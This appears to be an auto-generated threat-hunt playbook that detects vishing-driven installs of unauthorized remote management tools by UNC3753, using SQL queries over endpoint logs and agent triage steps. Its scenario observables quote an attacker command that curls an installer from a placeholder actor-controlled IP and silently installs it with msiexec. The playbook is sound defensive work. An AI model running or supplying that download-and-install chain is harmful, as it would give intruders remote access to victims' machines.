---
analysis: A static detection rule for AnyDesk creates high noise in environments where
  IT uses it. This hunt uses a gated flow to identify relevant tool presence before
  pivoting to find the rare installer and delivery behavior an analyst must weigh.
blind_spots:
- id: byod-telemetry-gap
  question: Did the user initiate the session from a personal device?
  requires: endpoint agent on personal devices
  risk: UNC3753 targets personal BYOD endpoints to access corporate VDI; these devices
    lack telemetry for process or software inventory scans.
  stage: initial-access-vishing-screen-share
- id: vishing-audio-content
  question: What verbal instructions were given to the target?
  requires: voice recording and transcription
  risk: The actual vishing event happens out-of-band; we only observe the technical
    aftermath of the social engineering success.
  stage: initial-access-vishing-screen-share
coverage:
- stage: initial-access-vishing-screen-share
  status: covered
  steps:
  - dns-privnote-lookups
- stage: rmm-tool-deployment
  status: covered
  steps:
  - rare-curl-installers
- stage: vdi-infrastructure-pivot
  status: covered
  steps:
  - software-inventory-lead
- reason: Belongs to another part of the 'UNC3753 targeted campaign against US law
    firms' series.
  stage: document-harvesting-and-staging
  status: out_of_scope
- reason: Belongs to another part of the 'UNC3753 targeted campaign against US law
    firms' series.
  stage: data-theft-and-exfiltration
  status: out_of_scope
guardrails:
  claims: no_unsupported
  evidence: citation_required
  missing_data: not_benign
  telemetry: untrusted
hunt:
  applicability: campaign-specific
  handoff: keep-as-periodic-hunt
  justification: "UNC3753 conducts fast-tempo intrusions that often complete within\
    \ 24 hours. This hunt identifies the precursors of data theft\u2014unauthorized\
    \ RMM deployment and vishing delivery\u2014before exfiltration begins."
  methodology: model-assisted
  trigger: intel-report
hypothesis: An intruder uses vishing to direct users to a self-destructing note service
  and installs unauthorized RMM tools to pivot into corporate VDI infrastructure.
labels:
- hunt
- attack.t1566
- attack.t1133
- attack.t1219
- attack.t1059.001
- attack.t1021.001
name: Interactive Remote Access and Support Tool Abuse
parameters:
  lookback_days:
    default: '14'
    description: Days of history to examine.
    type: number
  rmm_software:
    default:
    - anydesk
    - bomgar
    - zoho assist
    - citrix
    - windows365
    - quick assist
    - citrix workspace
    - windows 365
    - superops
    description: Software package names for RMM and VDI tools used by UNC3753.
    from:
      kind: article
      observed: '2026-05-01'
      ref: UNC3753 Targeted Campaign
    type: list[string]
  scope_hosts:
    default: []
    description: Hostnames identified in the scoping step; leave empty to scan the
      entire estate.
    type: list[host]
provenance:
  authors:
  - name: Huntbase hunt generation
    org: huntbase.io
  generated:
    by: huntbase-hunt-generation
    from: https://cloud.google.com/blog/topics/threat-intelligence/targeted-campaign-us-law-firms
    gates:
    - dry-run
    - lint
    - critic
    model: hb_google/gemini-3-flash-preview
rationale: Start by identifying hosts with the RMM or VDI tools mentioned in the report.
  Narrow the investigation to these hosts for the behavioral queries to reduce noise
  and processing cost.
references:
- name: Mandiant - UNC3753 Targeted Campaign Against US Law Firms
  url: https://cloud.google.com/blog/topics/threat-intelligence/targeted-campaign-us-law-firms
related:
- hunt: document-harvesting-and-staging
  reason: Once RMM tools are confirmed, the next hunt focuses on the sensitive keyword
    searches and staging activity the actor performs.
  relation: follows
scenario:
  stages:
  - name: Vishing and Screen-Sharing Initiation
    observables:
    - Zoom
    - Microsoft Teams
    - Quick Assist
    - privnote.com
    - invoice-themed emails from consumer accounts
    slug: initial-access-vishing-screen-share
    tactic: initial-access
    techniques:
    - T1566
    - T1133
  - name: RMM Agent Installation
    observables:
    - SuperOps.msi
    - AnyDesk
    - Bomgar
    - Zoho Assist
    - curl -sL http://[actor-controlled-ip]/installer -o SuperOps.msi
    - msiexec /i SuperOps.msi /quiet
    slug: rmm-tool-deployment
    tactic: execution
    techniques:
    - T1219
    - T1059.001
  - name: Pivot to Corporate VDI
    observables:
    - Windows365.exe
    - Citrix clients
    - VDI authentication from BYOD endpoints
    slug: vdi-infrastructure-pivot
    tactic: lateral-movement
    techniques:
    - T1021.001
  - name: Document Staging
    observables:
    - Downloads folder
    - Roaming profile path
    - iManage keyword searches (W-2, W-9, 1099, SSN)
    - OneDrive enumeration
    slug: document-harvesting-and-staging
    tactic: collection
    techniques:
    - T1083
    - T1074.001
  - name: Cloud and FTP Exfiltration
    observables:
    - WinSCP
    - Rclone
    - Google Drive browser uploads
    - Email forwarding to actor-controlled addresses
    - folder renaming to mimic victim branding
    slug: data-theft-and-exfiltration
    tactic: exfiltration
    techniques:
    - T1567.002
    - T1041
  summary: UNC3753 uses vishing to impersonate IT support and trick employees into
    launching screen-sharing sessions or installing RMM tools like AnyDesk and SuperOps.
    The actors pivot from BYOD devices to corporate VDI environments to harvest sensitive
    documents, which they stage in local folders before exfiltrating them via WinSCP,
    Rclone, or browser uploads for extortion.
series:
  index: 1
  slug: unc3753-targeted-campaign-against-us-law-firms
  title: UNC3753 targeted campaign against US law firms
  total: 2
severity: high
targets:
  analyst:
    name: Tier-2 analyst
    role: analyst
  endpoint:
    category: endpoint
    name: Endpoint telemetry (hb_ surfaces)
    telemetry:
    - endpoint
  hunter:
    agent: true
    name: Hunt agent
tlp: clear
type: investigation
---


# Interactive Remote Access and Support Tool Abuse

UNC3753 (Luna Moth) use 'Bazarcall' style vishing to bypass perimeter security, directing users to download unauthorized remote management tools like AnyDesk or SuperOps. This hunt identifies the sequence of a Privnote visit followed by the deployment of these tools and subsequent pivots into VDI environments like Citrix or Windows 365. It uses a gated flow to first scope the estate for relevant software before performing a deeper behavioral analysis of installer and session markers.

## software-inventory-lead
<!-- Remote access and VDI client inventory -->
Identify hosts that have remote management or VDI software installed to focus the investigation.

```sqlite target=endpoint role=scoping params=(rmm_software=rmm_software)
~~~yaml
expected: A list of hosts with RMM or VDI software. Silence is not evidence of absence
  if inventory is incomplete.
reads:
- device_hostname
- package_name
- package_version
- vendor_name
silence: not_evidence_of_absence
source: hb_software_inventory
verified: dry-run
verified_at: '2026-09-20'
~~~
SELECT device_hostname, package_name, package_version, vendor_name FROM hb_software_inventory WHERE instr(',' || '{{rmm_software}}' || ',', ',' || LOWER(package_name) || ',') > 0
```

## evaluate-lead
<!-- Evaluate lead hosts -->
```agent target=hunter
cite: required
context:
- software-inventory-lead
max_iterations: 3
objective: Identify hosts where the presence of RMM or VDI tools is unusual or matches
  the actor toolkit.
success_criteria: A recommendation of which hosts to scope into behavioral analysis.
tools:
- endpoint
```

## gate-on-inventory
<!-- Gate on software presence -->
if~: "the inventory evaluation identifies at least one host with unauthorized RMM or VDI software" (confidence: high, judge=hunter)
then: → behavior-fan-out
indeterminate: → analyst-review
unavailable: → analyst-review (blind_spot: byod-telemetry-gap)
else: → close-out

## behavior-fan-out
<!-- Investigate session and installer behavior -->
parallel:
- → dns-privnote-lookups
- → rare-curl-installers
join: → final-triage

## dns-privnote-lookups
<!-- Privnote DNS activity -->
Find hosts that visited the delivery platform used to transmit instructions.

```sqlite target=endpoint role=enrichment params=(scope_hosts=scope_hosts, lookback_days=lookback_days)
~~~yaml
expected: A host resolving Privnote. Absence suggests a different delivery mechanism
  was used.
reads:
- device_hostname
- query_hostname
- time
silence: not_evidence_of_absence
source: hb_dns_activity
verified: dry-run
verified_at: '2026-09-20'
~~~
SELECT device_hostname, query_hostname, time FROM hb_dns_activity WHERE LOWER(query_hostname) = 'privnote.com' AND ('{{scope_hosts}}' = '' OR instr(',' || '{{scope_hosts}}' || ',', ',' || device_hostname || ',') > 0) AND time >= datetime('now', '-{{lookback_days}} days')
```

## rare-curl-installers
<!-- Rare curl-initiated MSI installers -->
Stack-count command lines that download and install software via curl to find anomalies.

```sqlite target=endpoint role=baseline params=(scope_hosts=scope_hosts, lookback_days=lookback_days)
~~~yaml
baseline:
  compare: first_seen
  window: '{{lookback_days}}d'
expected: A command line seen on very few hosts. Silence proves the absence of this
  specific installer pattern.
prevalence:
  by: device_hostname
  key:
  - process_cmd_line
  rare_below: 5
reads:
- device_hostname
- process_cmd_line
- time
silence: evidence_of_absence
source: hb_process_activity
verified: dry-run
verified_at: '2026-09-20'
~~~
SELECT device_hostname, process_cmd_line, COUNT(DISTINCT device_hostname) AS host_count, MIN(time) AS first_seen FROM hb_process_activity WHERE (LOWER(process_cmd_line) LIKE '%curl%' AND LOWER(process_cmd_line) LIKE '%msiexec%') AND ('{{scope_hosts}}' = '' OR instr(',' || '{{scope_hosts}}' || ',', ',' || device_hostname || ',') > 0) AND time >= datetime('now', '-{{lookback_days}} days') GROUP BY device_hostname, process_cmd_line HAVING host_count < 5
```

## final-triage
<!-- Triage investigation evidence -->
```agent target=hunter
cite: required
context:
- evaluate-lead
- dns-privnote-lookups
- rare-curl-installers
max_iterations: 6
objective: Determine if any host shows a temporal sequence of visiting Privnote followed
  by a rare curl-initiated installation and presence of RMM tools.
success_criteria: A verdict of malicious, suspicious, or benign per host, citing relevant
  rows.
tools:
- endpoint
```

## route-on-verdict
<!-- Route on final verdict -->
if~: "the final triage verdict is malicious for at least one host" (confidence: high, judge=hunter)
then: → isolate-host
indeterminate: → analyst-review
unavailable: → analyst-review (blind_spot: byod-telemetry-gap)
else: → close-out

## isolate-host
<!-- Isolate host -->
```action target=endpoint
~~~yaml
approval: required
~~~
Isolate the host and revoke any active VDI or VPN sessions for the identified user.
```
→ analyst-review

## analyst-review
<!-- Analyst review -->
```manual target=analyst
Review the cited DNS and process rows. Confirm if the curl-initiated MSI belongs to an authorized technician. Check for manual data staging in the user Downloads or Roaming folders.
```
→ close-out

## close-out
<!-- Close out -->
```manual target=analyst
Document whether any suspicious activity was confirmed. If the tools found were legitimate, record a tuning note for those hosts.
```
→ end
